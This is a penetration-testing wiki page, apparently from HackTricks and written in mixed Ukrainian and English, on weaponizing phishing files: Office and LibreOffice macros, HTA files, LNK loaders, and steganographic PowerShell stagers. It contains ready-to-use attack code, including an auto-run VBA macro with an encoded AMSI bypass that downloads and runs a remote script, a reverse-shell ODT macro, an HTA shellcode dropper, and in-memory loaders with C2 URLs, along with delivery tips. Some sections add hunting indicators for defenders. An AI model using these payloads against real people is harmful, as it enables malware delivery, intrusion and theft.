# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word виконує перевірку даних файлу перед відкриттям файлу. Перевірка даних виконується у формі ідентифікації структури даних відповідно до стандарту OfficeOpenXML. Якщо під час ідентифікації структури даних виникає будь-яка помилка, файл, що аналізується, не буде відкрито.

Зазвичай файли Word, що містять macros, використовують розширення `.docm`. Однак можливо перейменувати файл, змінивши його розширення, і все одно зберегти здатність виконувати macro.\
Наприклад, файл RTF за задумом не підтримує macros, але DOCM файл, перейменований на RTF, буде оброблятися Microsoft Word і зможе виконувати macro.\
Ті самі внутрішні механізми та принципи застосовуються до всього software набору Microsoft Office Suite (Excel, PowerPoint тощо).

Ви можете використати таку команду, щоб перевірити, які розширення будуть виконуватися деякими Office programs:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files, що посилаються на remote template (File –Options –Add-ins –Manage: Templates –Go), який містить macros, також можуть “execute” macros.

### External Image Load

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Можна використовувати macros для запуску arbitrary code з документа.

#### Autoload functions

Чим вони поширеніші, тим імовірніше, що AV їх виявить.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manually remove metadata

Fo to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**.

#### Doc Extension

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
Do this because you **can't save macro's inside a `.docx`** and there's a **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer documents can embed Basic macros and auto-execute them when the file is opened by binding the macro to the **Open Document** event (Tools → Customize → Events → Open Document → Macro…). A simple reverse shell macro looks like:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Note the doubled quotes (`""`) inside the string – LibreOffice Basic uses them to escape literal quotes, so payloads that end with `...==""")` keep both the inner command and the Shell argument balanced.

Delivery tips:

- Save as `.odt` and bind the macro to the document event so it fires immediately when opened.
- When emailing with `swaks`, use `--attach @resume.odt` (the `@` is required so the file bytes, not the filename string, are sent as the attachment). This is critical when abusing SMTP servers that accept arbitrary `RCPT TO` recipients without validation.

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Примушення NTLM Authentication

Є кілька способів **примусити NTLM authentication "remotely"**, наприклад, можна додати **невидимі зображення** до email або HTML, які користувач відкриє (навіть HTTP MitM?). Або надіслати жертві **адресу файлів**, які **запустять** **authentication** просто під час **відкриття папки.**

**Перевірте ці ідеї та більше на наступних сторінках:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Не забудьте, що ви можете не лише вкрасти hash або authentication, але й **виконувати NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Дуже ефективні кампанії доставляють ZIP, який містить два легітимні decoy documents (PDF/DOCX) і шкідливий .lnk. Хитрість у тому, що фактичний PowerShell loader зберігається всередині сирих байтів ZIP після унікального маркера, а .lnk вирізає його й запускає повністю в memory.

Типовий flow, реалізований однорядковою PowerShell командою .lnk:

1) Знайти оригінальний ZIP у поширених шляхах: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, і в батьківському каталозі поточного working directory.
2) Зчитати байти ZIP і знайти жорстко заданий маркер (наприклад, xFIQCV). Усе після маркера — це вбудований PowerShell payload.
3) Скопіювати ZIP до %ProgramData%, розпакувати там і відкрити decoy .docx, щоб виглядати легітимно.
4) Обійти AMSI для поточного процесу: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Розобфускувати наступний stage (наприклад, видалити всі символи #) і виконати його в memory.

Приклад PowerShell skeleton для вирізання й запуску вбудованого stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Примітки
- Доставка часто зловживає репутаційними піддоменами PaaS (наприклад, *.herokuapp.com) і може gate payloads (подавати benign ZIPs на основі IP/UA).
- Наступний stage часто розшифровує base64/XOR shellcode і виконує його через Reflection.Emit + VirtualAlloc, щоб мінімізувати disk artifacts.

Persistence, що використовується в тому ж ланцюжку
- COM TypeLib hijacking контролю Microsoft Web Browser, щоб IE/Explorer або будь-який app, що його вбудовує, автоматично перезапускав payload. Див. деталі та готові до використання команди тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files, що містять ASCII marker string (наприклад, xFIQCV), доданий до archive data.
- .lnk, який перераховує parent/user folders, щоб знайти ZIP, і відкриває decoy document.
- AMSI tampering через [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Довготривалі business threads, що завершуються links, розміщеними під trusted PaaS domains.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Інший повторюваний pattern — це **`.lnk`, що імітує документ**, який одразу відкриває benign lure, поки в background готує справжній ланцюжок.

Observed workflow:
1. Shortcut **маскується під PDF** і використовує `conhost.exe` або подібний proxy для запуску obfuscated PowerShell downloader.
2. PowerShell фрагментує очевидні tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), тож naive detections, що шукають `iwr`, `gci`, `ren`, `cpi` або `schtasks`, пропускають command.
3. Stager спочатку завантажує **decoy document**, відкриває його для victim, а потім у background відновлює malicious files.
4. Payloads можуть записуватися з **junk extensions**, а потім перейменовуватися шляхом видалення filler characters, відкладаючи появу очевидних `.exe` / `.cpl` artifacts.
5. Persistence встановлюється через **scheduled task, що запускається щохвилини**, яка стартує trusted host binary з user-writable path.

Minimal hunting clues from this pattern:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Корисний layout для staging, на який варто звертати увагу:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Чому другий stage є stealthy

У case study Rapid7 scheduled task багаторазово запускав **`Fondue.exe`** з `C:\Users\Public\`. Оскільки **`APPWIZ.cpl`** був staged поруч і експортував **`RunFODW`**, trusted Microsoft binary side-loaded attacker's CPL замість legitimate system copy.

Потім CPL:
- Reads an **AES-256-CBC** blob from `C:\Windows\Tasks\editor.dat`
- Decrypts it through **Windows CNG / `bcrypt.dll`**
- Allocates executable memory and copies the decrypted shellcode
- Executes it indirectly by passing the shellcode pointer as the callback for **`EnumUILanguagesW`**

Останній крок варто шукати окремо: malware often avoids a direct `((void(*)())buf)()` jump and instead abuses a **legitimate callback-taking WinAPI** to transfer execution.

Decrypted payload у цій campaign був **Donut** shellcode, який потім fully mapped the final PE in memory and patched **AMSI/WLDP/ETW** in the current process before handing off execution. Для глибших notes on side-loading and memory-resident post-processing, see:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Практичні hunting pivots:
- `.lnk` spawning `powershell.exe` or `conhost.exe` followed by a visible decoy document.
- Short-lived downloads to **`C:\Users\Public\`** followed by immediate renames from nonsense extensions.
- Scheduled tasks with bland names such as `GoogleErrorReport` executing from **user-writable directories**.
- Trusted binaries loading **`.cpl` / `.dll`** files from the same non-system directory.
- Base64 text blobs written under **`C:\Windows\Tasks\`** and then read by the side-loaded module.

## Steganography-delimited payloads in images (PowerShell stager)

Recent loader chains deliver an obfuscated JavaScript/VBS that decodes and runs a Base64 PowerShell stager. That stager downloads an image (often GIF) that contains a Base64-encoded .NET DLL hidden as plain text between unique start/end markers. The script searches for these delimiters (examples seen in the wild: «<<sudo_png>> … <<sudo_odt>>>»), extracts the between-text, Base64-decodes it to bytes, loads the assembly in-memory and invokes a known entry method with the C2 URL.

Workflow
- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Примітки
- Це ATT&CK T1027.003 (steganography/marker-hiding). Маркери відрізняються між кампаніями.
- AMSI/ETW bypass і deobfuscation рядків зазвичай застосовуються перед завантаженням assembly.
- Hunting: скануйте завантажені зображення на наявні роздільники; виявляйте PowerShell, який звертається до зображень і одразу декодує Base64 blobs.

Також див. stego tools і carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Поширеною початковою стадією є невеликий, сильно обфусційований `.js` або `.vbs`, доставлений всередині архіву. Його єдина мета — декодувати вбудований Base64 string і запустити PowerShell з `-nop -w hidden -ep bypass`, щоб підготувати наступну стадію через HTTPS.

Скелет логіки (abstract):
- Зчитати вміст власного файлу
- Знайти Base64 blob між junk strings
- Декодувати в ASCII PowerShell
- Виконати за допомогою `wscript.exe`/`cscript.exe`, які викликають `powershell.exe`

Ознаки для Hunting
- Архівовані вкладення JS/VBS, що запускають `powershell.exe` з `-enc`/`FromBase64String` у command line.
- `wscript.exe`, який запускає `powershell.exe -nop -w hidden` із user temp paths.

## Windows files to steal NTLM hashes

Перегляньте сторінку про **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
